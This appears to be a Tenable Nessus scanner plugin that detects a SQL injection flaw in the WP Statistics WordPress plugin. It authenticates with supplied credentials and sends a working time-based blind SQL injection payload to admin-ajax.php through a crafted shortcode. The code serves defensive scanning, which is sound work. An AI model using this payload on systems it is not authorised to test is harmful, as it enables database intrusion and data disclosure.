#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(101303);
  script_version("1.4");
  script_cvs_date("Date: 2018/08/08 12:52:13");


  script_name(english:"WP Statistics Plugin for WordPress 'functions.php' wp_statistics_searchengine_query() SQLi");
  script_summary(english:"Attempts to exploit a SQL injection vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a remote
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WP Statistics Plugin for WordPress running on the remote web
server is affected by a SQL injection vulnerability due to improper
sanitization of user-supplied input to the
wp_statistics_searchengine_query() function in the functions.php
script. An authenticated, remote attacker can exploit this issue to
inject or manipulate SQL queries in the back-end database, resulting
in the manipulation or disclosure of arbitrary data.");
  # https://blog.sucuri.net/2017/06/sql-injection-vulnerability-wp-statistics.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bd6629cd");
  script_set_attribute(attribute:"solution", value:
"Upgrade the Statistics Plugin for WordPress to version 12.0.8 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/06/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/06/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/07/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP", "http/login", "http/password");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

user = get_kb_item_or_exit("http/login");
pass = get_kb_item_or_exit("http/password");

port = get_http_port(default:443, php:TRUE);

install = get_single_install(app_name:app, port:port);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin     = "WP Statistics";
plugin_dir = "/wp-content/plugins/wp-statistics/";
plugin_url = build_url(port:port, qs:dir + plugin_dir);

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  checks[plugin_dir + "readme.txt"][0] = make_list('=== WP Statistics ===');
  checks[plugin_dir + "languages/default.mo"][0] = make_list('Project-Id-Version: *WP Statistics');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Authentication
# The main API doesn't have an authentication mechanism other than using sessions/cookies
# so we must use the cookie retrieved via the web UI

encaps = get_port_transport(port);
if (empty_or_null(encaps) || encaps == ENCAPS_IP)
  exit(0, "Port "+port+" is not using encryption. Nessus will not send credentials over an unencrypted connection.");

#  Enable cookies
init_cookiejar();

#  This is simply meant to populate a possibly empty table if there have been zero hits on any posts
res = http_send_recv3(
  method          : "GET",
  item            : dir + "/?p=1",
  port            : port,
  follow_redirect : 1,
  exit_on_fail    : FALSE
); 

#  Login page for app verification and grabbing test cookie
res = http_send_recv3(
  method          : "GET",
  item            : dir + "/wp-login.php",
  port            : port,
  follow_redirect : 1,
  exit_on_fail    : TRUE
);

#  Check login page
if (
  res[0] !~ "^HTTP/[0-9.]+ +200 " ||
  "Log In</title>"                        >!< res[2] ||
  "login login-action-login wp-core-ui"   >!< res[2] ||
  '<form name="loginform" id="loginform"' >!< res[2]
)
  exit(1, "Unexpected WordPress login page at " + build_url(port:port, qs:dir + "/wp-login.php") + ".");

postdata = "log=" + user + "&" +
            "pwd=" + pass + "&" +
            "wp-submit=Log+In&" +
            "testcookie=1";

postdata = urlencode(
  str        : postdata,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=+&_"
);

# Attempt login
res = http_send_recv3(
  method          : 'POST',
  item            : dir + "/wp-login.php",
  data            : postdata,
  port            : port,
  content_type    : 'application/x-www-form-urlencoded',
  follow_redirect : 2,
  exit_on_fail    : TRUE
);

if (res[0] !~ "^HTTP/[0-9.]+ +200 ")
  exit(1, "Received unexpected HTTP response when attempting login: " + res[0]);

if (
  "<strong>ERROR</strong>: The password you entered for the username" >< res[2] ||
  "<strong>ERROR</strong>: Invalid username" >< res[2] ||
  "<strong>ERROR</strong>: The username field is empty" >< res[2] ||
  "<strong>ERROR</strong>: The password field is empty" >< res[2]
)
  exit(1, "Specified login or password is invalid.");

#  Cursory check for valid auth cookies
cookie_names = get_http_cookies_names();

cookies_found = 0;
foreach cookie_name (cookie_names)
  if (cookie_name =~ "^wordpress_(sec|logged_in)_") cookies_found++;

if (cookies_found < 2) exit(1, "The authentication cookies do not appear to be valid."); 

# Exploit
stimes = make_list(3, 9, 15);
num_queries = max_index(stimes);


vuln = FALSE;

for (i = 0; i < max_index(stimes); i++)
{
  http_set_read_timeout(stimes[i] + 10);
  then = unixtime();

  url = "/wp-admin/admin-ajax.php";
  postdata = 'action=parse-media-shortcode&shortcode=1[wpstatistics stat="pagevisits" time="total" id="1 UNION ALL SELECT SLEEP('+stimes[i]+');"]';

  postdata = urlencode(
    str        : postdata,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=+&_"
  );

  res = http_send_recv3(
    method  : "POST",
    port    : port,
    item    : dir + url,
    data    : postdata,
    content_type : 'application/x-www-form-urlencoded',
    exit_on_fail : TRUE
  );

  now = unixtime();
  ttime = now - then;
  
  query = 'SELECT SUM(count) FROM wp_statistics_pages WHERE `id` = 1 UNION ALL SELECT SLEEP(' +stimes[i]+ ');';

  time_per_query += 'Query #' + (i+1) + ' : ' + query + ' Sleep Time : ' +
  stimes[i] + ' secs  Response Time : ' + ttime + ' secs\n';

  overalltime += ttime;
  if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] + 5)) )
  {
    vuln = TRUE;

    output =
      'Blind SQL Injection Results' +
      '\n  Query                          : ' + query +
      '\n  Response time                  : ' + ttime + ' secs' +
      '\n  Number of queries executed     : ' + num_queries +
      '\n  Total test time                : ' + overalltime + ' secs' +
      '\n  Time per query                 : ' +
      '\n'+ "  " + time_per_query;

    continue;
  }
  else
    vuln = FALSE;
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, plugin_url, plugin + " plugin");

security_report_v4(
  port       : port,
  severity   : SECURITY_WARNING,
  generic    : TRUE,
  sqli       : TRUE,
  request    : make_list(http_last_sent_request()),
  output     : output
);
